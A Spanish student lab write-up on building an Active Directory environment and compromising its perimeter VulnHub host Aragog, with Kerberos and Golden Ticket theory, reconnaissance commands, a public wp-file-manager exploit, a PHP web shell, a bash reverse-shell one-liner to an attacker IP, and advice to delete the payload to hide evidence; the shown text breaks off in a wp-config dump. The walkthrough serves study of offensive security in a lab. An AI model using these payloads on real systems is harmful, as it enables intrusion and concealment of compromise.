---
title: "Auditoría de Active Directory y Pivoting (AD PWN)"
date: 2024-06-15T01:00:00+02:00
draft: false
featureimage: "img/portada.jpg"
showHero: true
heroStyle: "basic"
description: "Auditoría completa de un entorno Active Directory con técnicas de Pivoting: desde el compromiso perimetral hasta el control total del dominio y persistencia con Golden Ticket."
tags: [
  "active-directory",
  "pivoting",
  "pentesting",
  "chisel",
  "kerberos",
  "responder",
  "golden-ticket",
  "ntlm-relay",
  "mimikatz",
  "impacket",
  "cve-2024-21413",
  "wordpress"
]
categories: ["Active Directory", "Pentesting", "Pivoting"]
showTableOfContents: true
---

## INTRODUCCIÓN

Para mi proyecto final de síntesis de CFGM-SMX decidí meterme de lleno en el barro de la **ciberseguridad ofensiva** y montar un laboratorio para auditar dos conceptos clave: **Pivoting** y ataques contra **Active Directory (AD PWN)**.

La idea era simular un entorno corporativo realista: una máquina perimetral expuesta al exterior con servicios web vulnerables, y detrás de ella, una red interna con un Domain Controller y clientes Windows completamente aislados de internet. A partir de ahí, el objetivo fue comprometer la máquina perimetral, pivotar hacia la red interna y escalar privilegios hasta hacerme con el control total del dominio y dejar persistencia.

Mis dos grandes objetivos en este proyecto fueron:

* **Explorar el Pivoting en profundidad:** entender cómo usar un equipo comprometido como proxy para saltar entre segmentos de red a los que inicialmente no tengo acceso directo.
* **Auditar y vulnerar Active Directory:** explotar fallos de configuración, ataques de credenciales (Kerberos, NTLM Relay) y crear persistencia mediante un Golden Ticket.

Teniendo esto en cuenta, construí el siguiente laboratorio:

* **Aragog (Debian / VulnHub):** máquina perimetral con un servicio web en el puerto 80. Dispone de dos interfaces de red: una hacia mi red atacante y otra hacia la red corporativa interna.
* **DC-Company (Windows Server 2016 Datacenter):** el Domain Controller (DC) de la empresa con servicios de Active Directory, DNS, DHCP y un servidor de correo local (hMailServer con IMAP/POP3).
* **Clientes Windows:** puestos de trabajo clientes de Windows dentro del dominio `visma.local`.

## GESTIÓN DEL PROYECTO

### Sistemas operativos en la red objetivo

* Como ya he comentado en la introducción, cuento con 5 máquinas en total: empezando con la máquina Aragog, esta es un servidor Debian descargado desde [Vulnhub](https://vulnhub.com/). Después contamos con 4 Máquinas dentro del Active Directory, donde se encuentran el Domain Controller (DC) con Windows server 2016 datacenter junto a 3 máquinas “clientes” con Windows 11 dentro del Dominio del Active Directory.

### Sistema operativo máquina principal

* En este caso existe una 6a máquina, esta es mi máquina principal desde donde voy a realizar las pruebas de penetración. En este caso cuento con Kali Linux (una distribución de Linux basada en Debian con muchas herramientas de ciberseguridad pre-instaladas). Escogí esta ya que era la ISO que venía descargada en los PCs de clase y traía herramientas que iba a utilizar. Para darle algo de personalidad a la VM decidí ir con un entorno personalizado: **BSPWM** como gestor de ventanas, **sxhkd** para los keybindings y la terminal **Kitty** con **zsh** en vez de bash.

### Red

* Usé la red de clase configurando mi máquina atacante y la máquina Aragog en modo adaptador puente. La razón de esto es que simulan que la Aragog esta expuesta con un servicio Web a la GAN desde donde la máquina atacante es capaz de atacarla y entrar dentro del entorno empresarial.

Una vez vista la idea del entorno, paso a los conceptos básicos para poder entender el proyecto.

# Teoría

## Pivoting

En primer lugar empezaré explicando qué es el pivoting. Dentro del entorno de la ciberseguridad el pivoting es una técnica donde se usa un equipo vulnerado como “proxy” para poder acceder a un segmento de red al cual inicialmente no tenía acceso, sea porque tiene 2 interfaces (poco habitual) o porque tiene acceso a otras VLANS.

La victima al hacer de proxy nos permite redirigir todo el tráfico hacia (como ya he dicho) a otro segmento lo que hace que podamos vulnerar equipos a los que antes no llegábamos.

Aquí un apoyo visual sobre como se vería el Pivoting.

<figure><img src="img/Pasted image 20261007104024.png" alt=""><figcaption><p>Aquí observamos como la máquina atacante se encuentra en una red distinta a la máquina Objetivo, pero el Pivote (que es una maquina del medio) tiene 2 interfaces de red, una en el mismo segmento de red que la máquina atacante y la otra en el mismo que la máquina objetivo. Por lo que si conseguimos vulnerar la máquina Pivote podemos llegar a acceder a la máquina objetivo.</p></figcaption></figure>

Una vez entendido cómo funciona el Pivoting, paso a explicar qué es Active Directory ya que es la siguiente fase.

## Active Directory

Entendemos como Active Directory a la solución que ofrece Microsoft a entornos empresariales. Este permite centralizar toda la información y recursos que estén disponibles a un equipo. Se compone por el Domain Controller (DC) y los clientes, también puede contar con otros servidores para tener redundancia en los servicios como DNS, DHCP, etc. Pero sus funciones principales/básicas son las nombradas

El DC es un Windows Server Datacenter al que se le instala el rol de *Active Directory*. Este rol le permite obtener toda la información del dominio y también le permite gestionar todos los usuario y equipos de la red que tengan Active Directory, de manera que (como hemos dicho) se mantiene toda la información centralizada.

Este también se ocupa de la autenticación, aunque normalmente lo hace por *Kerberos* pero si este servicio por alguna razón no se encuentra disponible usará el servicio *NTDS* para autenticarse.

El servicio NTDS ocupa un archivo llamado NTDS.dit para su funcionamiento, este archivo es donde se almacenan los hashes NTLM (contraseña del user cifrada) de todos los usuarios del dominio junto el grupo al que pertenecen. Por lo que es un archivo muy critico dentro del dominio como del sistema.

## Kerberos

El nombre de Kerberos procede de la mitología griega y hace referencia a Cerbero, un perro de tres cabezas que custodiaba las puertas del mundo de los muertos. El nombre alude a las tres "cabezas" del protocolo Kerberos: el cliente, el servidor y el centro de distribución de claves (KDC) de Kerberos, que emite los "tickets" de Kerberos.

Un "ticket" de Kerberos es un certificado digital, emitido por un servidor de autenticación y cifrado con la clave del servidor, que permite a los hosts demostrar su identidad entre sí de forma segura. Es lo que se conoce como autenticación mutua.

Como he explicado anteriormente, Kerberos es un servicio que gestiona los inicios de sesión a otros servicios dentro del AD, por lo que así se vería un inicio de sesión a un servicio que este bajo el “control” del DC:

* **Solicitud del Ticket TGT por parte del cliente**
  * El cliente solicita un Ticket Granting Ticket (TGT) para autenticarse en la red.
  * Es importante resaltar que el TGT incluye un "timestamp", que marca el momento exacto en el que se generó el ticket. Este timestamp es clave, ya que el ticket se encripta utilizando la contraseña "hasheada" del cliente (el Hash NT del usuario).
  * El **KDC** (Key Distribution Center) es un componente instalado en el **DC** (Domain Controller), responsable de enviar y recibir los tickets TGT.
* **Envío del Ticket TGT por parte del DC**
  * El **DC** envía el TGT al cliente, cifrado con la contraseña del usuario **krbtgt** (usuario principal de Kerberos).
  * Una vez recibido el TGT, el cliente realiza una solicitud al **TGS** (Ticket Granting Service) para obtener acceso a un servicio específico en la red.
* **Solicitud de TGS**
  * El TGS es responsable de autenticar al cliente para un servicio particular.
  * Debido a que el TGT se genera con el usuario **krbtgt**, el TGS puede verificar que los permisos asociados al TGT son válidos.
* **Envío del TGS por parte del servidor**
  * Si el TGT es válido y el cliente está autorizado, el servidor envía el TGS al cliente.
  * Este ticket (TGS) permite al cliente acceder al servicio solicitado.
* **Presentación del TGS al servicio**
  * El cliente presenta el TGS al servicio correspondiente para autenticar su acceso y completar el proceso de inicio de sesión.

## Golden Ticket Attack

Una vez entendido cómo funciona Kerberos, paso a explicar uno de los ataques principales realizados en este trabajo: el **Golden Ticket Attack**.

Este es un ataque donde el objetivo final es conseguir un Ticket de Concesión Kerberos (TGT) falsificado con la "firma" del servidor para obtener acceso sin restricciones a servicios o recursos dentro de un dominio Active Directory.

De manera sencilla el proceso es algo por el estilo: Para ello primero necesitamos un usuario y contraseña validos en el dominio, después debemos extraer el hash utilizado por el sistema Kerberos para autenticar los tickets. Con la clave de KRBTGT en posesión, podemos generar un Golden Ticket falso.

El Golden Ticket es un ticket de autenticación con una firma criptográfica válida, que permite hacerse pasar por cualquier usuario dentro del dominio, incluso uno con privilegios elevados, como un administrador.

# Preparación del entorno

Con la base teórica clara, pasé a preparar el laboratorio de Active Directory: un Windows Server Datacenter con el rol de Domain Controller (DC) y las máquinas clientes Windows. El Windows Server aparte de tener el rol de DC, también ofrecerá otros servicios como:

* Correo
* Servidor DHCP
* Servidor DNS

Así que después de haber enumerado todos los servicios que ofrecerá, toca crear la máquina.

## Crear máquinas

En mi caso utilicé Windows Server 2016 Datacenter y le asigné el hostname `DC-Company`.

* Le asigné 4 GB de RAM, 2 núcleos y habilité el modo EFI.
* De disco le asigné 400 GB.

Una vez tenemos esto, ya podemos iniciar la máquina virtual (si vamos a poner la MV en una red NAT o vamos a modificar la interfaz de red, antes de inicarla, modificarlo). Procedemos con la instalación normal, Al escoger la versión, debemos escoger la “Windows Server 2016 Datacenter Evaluation (Desktop Experience)”.

<figure><img src="img/Pasted image 20261007104113.png" alt=""><figcaption></figcaption></figure>

Una vez Instalado, nos pedirá poner una contraseña de administrador para la Máquina, se la indicamos y acabará de iniciar. Una vez acabe de iniciar, nos logueamos y nos aparecerá&#x20;

<figure><img src="img/Pasted image 20261007104149.png" alt=""><figcaption></figcaption></figure>

## Instalando servicios

Para poder instalar los servicios que necesitamos lo que haremos sera dirigirnos a manage > add roles and Features y desde ahí podremos instalar lo que necesitamos que en nuestro caso serian 3 servicos necesarios, active directory, dns y dhcp.

<figure><img src="img/Pasted image 20261007104209.png" alt=""><figcaption></figcaption></figure>

Aceptaremos todo y en el apartado de confirmación, confirmaremos pulsando “install”para así se instale lo escogido anteriormente.

Una vez instalado nos saldrá de esta manera, ya podremos cerrarlo.

Arriba a la derecha habrá una bandera el cual son las notificaciones, pulsaremos en ella y nos deberá salir un apartado el cual será el active directory, si pulsamos en él, nos llevará a la siguiente pestaña (lo que se muestra en imagen), creé el dominio con el nombre `visma.local`.

<figure><img src="img/Pasted image 20261007104226.png" alt=""><figcaption></figcaption></figure>

Seguido nos pedirá una constraseña para nuestro dominio, tendremos que tener activado (en la misma pestaña) "Domain Name System (DNS) server" y "Global Catalog (GC)". En opciones adicionales le asigné el nombre NetBIOS correspondiente.

Una vez aceptemos todo nos pedirá reiniciar la máquina, la reiniciamos.

## Cambiando el HostName

Para cambiar el nombre pc haremos click derecho en el símbolo de Windows de nuestra barra de tareas y nos dirigiremos a "System".

<figure><img src="img/Pasted image 20261007104246.png" alt=""><figcaption></figcaption></figure>

Nos saldrá una ventana con datos del sistema, deberemos darle a "Change settings".

Saltara otra ventana el cual para poder cambiarle el nombre deberemos pulsar en "Change", escribiremos el nombre que queramos ponerle a nuestro pc, cuando aceptemos nos pedirá reiniciar para que se pueda cambiar correctamente, no es obligatorio reiniciar pero seria conveniente.

## Creación de usuarios AD

Comencé creando los usuarios del Active Directory en Tools > Active Directory Users and Computers. Creé los usuarios estándar de pruebas con contraseñas seguras para simular cuentas de empleados sin privilegios.

<figure><img src="img/Pasted image 20261007104304.png" alt=""><figcaption></figcaption></figure>

## Configuración del DHCP

Para configurar el DHCP será importante tenerlo instalado como comentamos en el primer punto. Comenzaremos yendo a la bandera veremos la notificación del DHCP, cuando le demos a "complete DHCP configuration" se nos abrira una ventana, en autorización autoricé con `VISMA\Administrator`, aceptamos y instalamos.

<figure><img src="img/Pasted image 20261007104319.png" alt=""><figcaption></figcaption></figure>

Seguido fui a Tools > DHCP, entraremos abriremos las carpetas hasta entrar a iPv4, añadiremos una nueva ip comenzando por la ip 192.168.1.40 hasta la 192.168.1.200, con la máscara 255.255.255.0 pondremos 90 días, como router pondremos la ip 192.168.1.1 como name Domain pondremos el que pusimos al crear nuestro dominio visma.local

<figure><img src="img/Pasted image 20261007104423.png" alt=""><figcaption></figcaption></figure>

## Installing hmailserver

Para que todo vaya correctamente deberemos instalar una característica llamada ".NET Framework 3.5".

<figure><img src="img/Pasted image 20261007104542.png" alt=""><figcaption></figcaption></figure>

Una vez este instalada, iremos a nuestro navegador y instalaremos el hmailserver (url), cuando ya lo hayamos instalado, lo iniciaremos, nos pedirá una contraseña pondremos la que nosotros queramos , una vez dentro añadiremos un dominio, pondremos el dominio que creamos anteriormente en nuestro AD, creé las cuentas de correo en Accounts > Add correspondientes a los usuarios del dominio.

<figure><img src="img/Pasted image 20261007104558.png" alt=""><figcaption></figcaption></figure>

## Creando y configurando los clientes del AD DC

A continuación creé las máquinas cliente con Windows Pro (necesario para unirse a un dominio de Active Directory):

<figure><img src="img/Pasted image 20261007104612.png" alt=""><figcaption></figcaption></figure>

Una vez lista la primera máquina, la cloné para tener el segundo equipo cliente. Al iniciar ambas y ejecutar `ipconfig` observé que ambas tenían exactamente la misma IP asignada por DHCP:

<figure><img src="img/Pasted image 20261007104625.png" alt=""><figcaption></figcaption></figure>

En lo que nos deberíamos fijar es en el “Unique ID”, este es la dirección MAC y es que al clonar las máquinas también se ha clonado la dirección MAC. Por lo que, para resolver este problema, simplemente debemos Apagar una máquina, entrar en configuración > red > Avanzado. Y aquí pedir otra MAC. Y ya está, se han cambiado solo las últimas 3 duplas de la dirección MAC, ya que las 3 primeras, hacen referencia al fabricante (Virtual box).

Una vez tenemos esto, ya podemos inicar la máquina y ver que tenemos una dirección ip distinta y además nos aparece en “Adresses Leases” en el Win Server.

<figure><img src="img/Pasted image 20261007104639.png" alt=""><figcaption></figcaption></figure>

### Añadir ordenadores al AD

Para añadir ordenadores al AD, es decir, añadirles nuestro ddominio, deberemos dirijirnos a la confirguación de nuestra máquina, dentro de cuentas > Obtener acceso a trabajo o escuela, seleccionaremos conectar como nosotros no tendremos que poner un correo eléctronico sino un dominio, le daremos abajo, donde dice "UNir este dispositivo a un dominio local AD", pondremos nuestro dominio visma.local.

<figure><img src="img/Pasted image 20261007104654.png" alt=""><figcaption></figcaption></figure>

Añadí el equipo al dominio `visma.local` con las credenciales de usuario y reinicié el equipo, repitiendo el proceso para el resto de máquinas cliente.

<figure><img src="img/Pasted image 20261007104706.png" alt=""><figcaption></figcaption></figure>

Para las pruebas de laboratorio desactivé el antivirus para evitar interferencias en los payloads. Primero en el DC, para ello entramos en PowerShell ISE:

```powershell
Uninstall-WindowsFeature -Name Windows-Defender
```

<figure><img src="img/Pasted image 20261007104721.png" alt=""><figcaption></figcaption></figure>

En las máquinas cliente desactivé Windows Defender desde Configuración y a través de directivas locales (`gpedit.msc`).

<figure><img src="img/Pasted image 20261007104732.png" alt=""><figcaption></figcaption></figure>

# Ataque

Una vez listo el laboratorio, pasé a la fase de explotación comenzando por la máquina perimetral Aragog.
## Aragog

Como la máquina Aragog venía preparada para VirtualBox y en mi caso utilicé VMware Workstation, las interfaces de red no coincidían. Al no disponer de contraseñas, edité los parámetros de arranque en GRUB pulsando `e` para conseguir una shell root en el boot:

```bash
linux /boot/vmlinuz-3.2.0-24-generic root=UUID=bc6f8146-1523-46a6-8b\
6a-64b819ccf2b7 ro  quiet splash
initrd /boot/initrd.img-3.2.0-24-generic
```

Justo debemos modificar donde pone `ro quiet spalsh` y poner `rw init=/bin/bash`, se vería tal que asi:

```bash
linux /boot/vmlinuz-3.2.0-24-generic root=UUID=bc6f8146-1523-46a6-8b\
6a-64b819ccf2b7 rw init=/bin/bash
initrd /boot/initrd.img-3.2.0-24-generic
```

Pulsamos la tecla `F10` y nos dara una shell privilegiada sin acceso a internet. Una vez dentro podemos configurar la interfaz de red.

### RED

```bash
sudo nano /etc/network/interfaces
```

Nos tiene que quedar como se muestra la imagen.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fekk8NgLxusDbt52faD2o%2Fimage.avif?alt=media&amp;token=8c2bf761-111c-42bf-a2c8-4035598b3721" alt=""><figcaption></figcaption></figure>

En caso de que queramos saber que hemos puesto en la interface podemos utilizar el siguiente comando:

```bash
cat /etc/network/interfaces
```

Reiniciamos la maquina, y nos dirigimos a nuestra maquina principal es importante tener la Aragog encendida para que nos encuentre la ip, para saber que ip tiene escanearemos la red poniendo el siguiente comando:

```bash
arp-scan -I ens33 --localnet 
```

Si solamenente queremos buscar la maquina, y estamos usando VmWare podremos añadirle el comando `grep` y entre comillas pondremos lo siguiente:

```bash
arp-scan -I ens33 --localnet | grep "VMware, Inc."
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FDhk0TXuK9O1kDbWQ4rRO%2Fimage.png?alt=media&amp;token=794185b8-e458-4e72-821e-7b1009610cda" alt=""><figcaption></figcaption></figure>

### ATAQUE <a href="#ataque" id="ataque"></a>

Revisaremos si la maquina se encunetra activa o si hay algun firewall bloqueando las trazas ICMP, para ello debermos hacer un `ping`.

```bash
ping -c 1 IP_DE_LA_ARAGOG
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F9DNe3YGkWT0LGokBg3D9%2Fimage.png?alt=media&amp;token=3ca3a9c7-408e-4154-91a0-2af76dc9cf19" alt=""><figcaption></figcaption></figure>

Comprobé conectividad enviando una traza ICMP con `ping`: también vemos que el ttl = 64 por lo que es una máquina Linux, si el ttl es “=” o menor a 64 quiere decir, que probablemente estamos ante una máquina Linux. Podemos observar también que ningún paquete a sido descartado, entonces ya sabemos que esta en el mismo segmento de red y esta preparada para ser vulnerada.

Una vez tengamos esa información, deberemos hacer un escaneo de puertos para ello utilizaremos la herramienta nmap, especializada en escanear puertos, pondremos parametros ya que queremos solamente cosas especificas. (si quieres saber sobre los parámetros entra aqui:.....)

```bash
nmap -sS -p- --open -T5 --min-rate 5000 IP_DE_LA_ARAGOG -n -Pn -vvv -oG allPorts
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fx0ueYlA2EVBWNunJNFgz%2Fimage.png?alt=media&amp;token=f6b7ae84-2889-4db8-96e6-ec0d2adfcdf5" alt=""><figcaption></figcaption></figure>

Una vez hemos acabado con el escaneo de puertos ahora debemos detectar que servicios o versiones están corriendo en estos puertos, para ello una vez tenemos los puertos abiertos copiados a la clipboard

```bash
nmap -sCV -p22,80 IP_DE_LA_ARAGOG -oN portServices
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FoL7nVXMVReiyo7NfNvFx%2Fimage.png?alt=media&amp;token=a004b10a-ceff-4640-9a4b-6fcf1d5a51d2" alt=""><figcaption></figcaption></figure>

hecho el escaneo encontramos que el puerto 22 está corriendo ssh, pero como no tenemos ninguna clave de momento no podemos hacer nada y un ataque de fuerza bruta tardaríamos bastante, por lo que lo dejamos como ultima opción. Encontramos que en el puerto 80 está corriendo apache, lo que quiere decir que hay una web corriendo por detrás.

Si buscamos la ip de la máquina (192.168.1.62) con el puerto 80 encontramos lo siguiente

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F9DaoZADARPI5Umvfovbi%2Fimage.avif?alt=media&amp;token=209a4832-33c4-478e-9b54-fb46dda20a69" alt=""><figcaption></figcaption></figure>

De primeras no vemos nada que nos llame la atención así que vamos a ver el código fuente para ver si hay algo interesante, para ello hacermos click en ctrl + u

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FoO8XKo7n4XmxJG1fj29R%2Fimage.png?alt=media&amp;token=71873604-a875-4947-af1b-599ca4ca7885" alt=""><figcaption></figcaption></figure>

Y no encontramos nada. Lo siguiente a probar sería los subdominios, pero aquí no tenemos dominio ni servidor dns al que preguntarle los posibles subdominios o subdominios indexados por el certificado ssl. Así que haremos fuzzing, esto nos servirá para poder determinar si se encuentra algún directorio escondido dentro del servidor web. Para ello utilizaremos `gobuster`, aunque también podemos utilizar herramientas como `fuff` o `wfuzz`. ( En caso que no este instalado puedes ver como se instala aqui ...... y para saber que es cada parámetro entra aquí .......)

```bash
gobuster dir -u http://IP_DE_LA_ARAGOG:80 -w /usr/share/Discovery/Web-Content/directory-list-
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FvDtZioO2gg0IVkNjoobr%2Fimage.png?alt=media&amp;token=06e0c0e9-2396-4398-b92c-20dbe91ed8f4" alt=""><figcaption></figcaption></figure>

Una vez finalizado el escaneo encontramos que el directorio “/blog” y “/javascript” Nos redirigen haca otro lado mientras “/server-status” nos devuelve un 403 (el servidor recibe la petición pero deniega el acceso a la acción), si entramos a java script, nos dará un error llamado FORBIDDEN, en cambio si entramos a blog vemos la web

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FxgxI8hrZm1tPEhqWmcSz%2Fimage.png?alt=media&amp;token=50fc9462-7045-4521-b20f-4b8ec704a5e8" alt=""><figcaption></figcaption></figure>

Podemos observar que es una páquina Wordpress (ya que cuenta con Wordpress Comenter y aparte de que pone “Proudly powered by Wordpress”.) , pero por alguna razón la web no esta cargando los estilos “css” , por lo que antes vamos a revisar el código fuente. Primero en busca de comentarios de algún desarrollador que nos de información valiosa y después buscaremos en el "head" para ver que ocurre y poque no llama bien al estilo css, como hicimos anteriormente, ctrl + u

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FA6zIj9xUvdHLM7A24JwB%2Fimage.png?alt=media&amp;token=d730eaad-83f5-410b-9d47-e3cffe9252e9" alt=""><figcaption></figcaption></figure>

Ya que llama los estilos desde un dominio, para poder resolverlo debemos añadir el dominio wordpress.aragog.hogwarts y aragog.hogwarts, para que nuestro pc sea capaz de resolver el dominio, en el siguiente directorio:

```
sudo nano /etc/hosts
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FuEgapiuXzYrltiwDxdDE%2Fimage.png?alt=media&amp;token=0544fa68-4c59-4620-8721-bd8b6ab65415" alt=""><figcaption></figcaption></figure>

Ahora si buscamos el dominio “wordpress.aragog.hogwarts” en el navegador nos resuelve la web correcamente

Esto es lo que nos reporta wappalyzer, sobre la web

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FLm2orbZOJajMMVXYkCRQ%2Fimage.png?alt=media&amp;token=a20a6f08-0cc0-4398-a3cf-30eb838d401c" alt=""><figcaption></figcaption></figure>

Podemos ver que esta pagina tiene wordpress, si intentamos entrar en el directorio “wp-content”

```
http://wordpress.aragog.hogwarts/blog/wp-content/
```

Para ver si tenemos directory listing, para poder tener directory listing en una web se deben cumplir los siguientes requisitos:

* No contiene un archivo llamado “index.html”
* Y no contiene un archivo “.htacces”, este archivo sirve para bloquear el acceso al directory listing como tal.

Como lo que queríamos era buscar plugions de wordpress que fuesen vulnerables probaremos con otra herramienta llamada `WPscan`

```
wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u,vp --plugins-detection aggressive
```

Podemos encontrar que ha detectado varios plugins con vulnerabilidades, pero de todos esos el que mas me llama la atención es uno que me permite subir archivos de sin autenticarme y que de ahí puede derivar en una ejecución remota de comandos. En esta [web](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9/) nos dejan un POC (proof of concept) donde entro de este tenemos el script en Python que nos permite subir archivos remotamente. Para descargarlo haremos un `wget` del archivo

```
wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
```

Si hacemos un `cat` mas el archivo que acabamos de instalar podemos ver el código python y entender cuál es su función.

Creamos un archivo llamado `payload.php` dónde agregaremos las siguientes líneas.

```
sudo nano payload.php
```

Dónde agregaremos las siguientes líneas.

```
<?php
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Guardamos (ctrl + s) y salimos (ctrl + x) Ahora hemos de juntar el escript en la url de la web, poniendo el siguiente comando.

```
python3 2020-wp-file-manager-v67.py http://wordpress.aragog.hogwarts/blog/
```

Si entramos a la url : `http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php` no nos mostrará nada ya que hemos de poner un comando al final del link añadiendole al final de la url `cmd=COMANDO_QUE_QUERAMOS`

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FgD0KkfjmPmKwz57euX6a%2Fimage.png?alt=media&amp;token=17641d1a-fe03-4473-9779-a6cbaba5ae92" alt=""><figcaption></figcaption></figure>

> En este ejemplo se muestra el comando `hostname -l` que nos dice la ip

Una vez hemos verificado que tiene 2 interfaces de red vamos a entablar una reverse Shell. Para ello nos vamos al puerto 443 y ponemos un one liner para una reverse Shell:

```
bash -c "bash -i >& /dev/tcp/IP_ATACANTE/443 0>&1"
```

Una vez ejecutamos el comando podemos observar que hemos obtenido una reverse shell

```
nc -nvlp 443
```

esta Shell no es del todo interactiva ya que no podemos hacer ctrl c, ctrl l, ctrl u, no podemos utilizar las flechas para ir al historial de comandos, etc... Para solucionar esto se hace un tratamiento de la tty, con tratamiento de la tty básicamente nos referimos a la configuración y gestión de la terminal. Para ello hay que hacer los siguientes comandos

```
‎script /dev/null -c bash
```

ctrl + z

```
stty raw -echo; fg
reset xterm
```

‎Una vez hecho esto solo nos queda resetear el tamaño de la terminal, para eso primero debemos saber el tamaño de nuestra terminal por lo que en una terminal aparte ejecutamos el comando `stty size`

Reseteamos la Variable de entrno TERM para que sea igual a “xterm”, xterm es un emulador de terminal muy utilizado que es el que nos permite limpiar pantalla con las hotkeys “ctrl + L” usar “ctrl + C”, poder usar las flechas para moverse, etc. ‎

```
export TERM=xterm
stty rows 64 columns 253
```

Una vez hecho eso reseteamos el tamaño de la terminal a nuestro tamaño de la ventana y ya está. Ya tenemos una reverse Shell totalmente interactiva que si hacemos “ctrl + c” no se nos cierra.

Nos dirigimos a home, en caso de que no estemos dentro hacemos `cd /home/` al hacer `ls` vemos un directorio llamado hagrid98, si repetimos el comando `ls` vemos el .txt, para verlo haremos `cat horcrux1.txt` ‎ Nos encontramos que esta en base64, por lo que para pasarlo a texto legible o “human readable” debemos de ejecutar el comando:

```
echo “texto en base 64” | base64 -d; echo
```

> El -d es para decodearlo y el echo del final es para reiniciar la salida

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FpJ72hbC84oDvrh1AMa9O%2Fimage.avif?alt=media&amp;token=9235d004-da14-4c44-b76c-560932067804" alt=""><figcaption></figcaption></figure>

Buscaremos si encontramos algo útil, como esta corriendo apache debemos buscar el directorio de apache que `“/etc/apache2”` una vez dentro encontramos que hay un directorio llamado `“sites-enabled”` entramos y dentro hay un wordpress.conf, al hacerle un `cat` nos revela que el directorio donde esta montado el wordpress es `“/usr/share/wordpress”` si entramos, encontramos que hay un direcorio interesante llamado `“wp-content”`, si entramos y nos dirigimos a `plugins>wp-file-manager>lib>files` encontramos nuestro `payload.php`, de momento no lo borraremos porque sin el no podemos tener la reverse Shell, pero una vez escalemos y tengamos conexión por ssh debemos borrarlo para dejar menos evidencias.

```
cd /etc/apache2/sites-enabled
cat wordpress.conf
```

```
cd /usr/share/wordpress && ls
```

```
cd /plugins/wp-file-manager/lib/files
```

Una vez dentro con el comando `ls` podemos ver que hay una archivo `wp-config.php`, nos fijaremos en lo que hay dentro de el como hemos hecho anterior mente utilizando el comando `cat`.

```
cat wp-config.php
```

Se mostrará un archivo como el que veremos a continuación:

```
<?php
/***
 * WordPress's Debianised default master config file
 * Please do NOT edit and learn how the configuration works in
 * /usr/share/doc/wordpress/README.Debian
 ***/

/* Look up a host-specific config file in
 * /etc/wordpress/config-<host>.php or /etc/wordpress/config-<domain>.php
 */
$debian_server = preg_replace('/:.*/', "", $_SERVER['HTTP_HOST']);
$debian_server = preg_replace("/[^a-zA-Z0-9.\-]/", "", $debian_server);
$debian_file = '/etc/wordpress/config-'.strtolower($debian_server).'.php';
/* Main site in case of multisite with subdomains */
$debian_main_server = preg_replace("/^[^.]*\./", "", $debian_server);
$debian_main_file = '/etc/wordpress/config-'.strtolower($debian_main_server).'.php';

if (file_exists($debian_file)) {
    require_once($debian_file);
    define('DEBIAN_FILE', $debian_file);
} elseif (file_exists($debian_main_file)) {
    require_once($debian_main_file);
    define('DEBIAN_FILE', $debian_main_file);
} elseif (file_exists("/etc/wordpress/config-default.php")) {
    require_once("/etc/wordpress/config-default.php");
    define('DEBIAN_FILE', "/etc/wordpress/config-default.php");
} else {
    header("HTTP/1.0 404 Not Found");
    echo "Neither <b>$debian_file</b> nor <b>$debian_main_file</b> could be found. <br/> Ensure one of them exists, is readable by the webserver and contains the right password/username.";
    exit(1);
}

/* Default value for some constants if they have not yet been set
   by the host-specific config files */
if (!defined('ABSPATH'))
    define('ABSPATH', '/usr/share/wordpress/');
if (!defined('WP_CORE_UPDATE'))
    define('WP_CORE_UPDATE', false);
if (!defined('WP_ALLOW_MULTISITE'))
    define('WP_ALLOW_MULTISITE', true);
if (!defined('DB_NAME'))
    define('DB_NAME', 'wordpress');
if (!defined('DB_USER'))
    define('DB_USER', 'wordpress');
if (!defined('DB_HOST'))
    define('DB_HOST', 'localhost');
if (!defined('WP_CONTENT_DIR') && !defined('DONT_SET_WP_CONTENT_DIR'))
    define('WP_CONTENT_DIR', '/var/lib/wordpress/wp-content');

/* Default value for the table_prefix variable so that it doesn't need to
   be put in every host-specific config file */
if (!isset($table_prefix)) {
    $table_prefix = 'wp_';
}

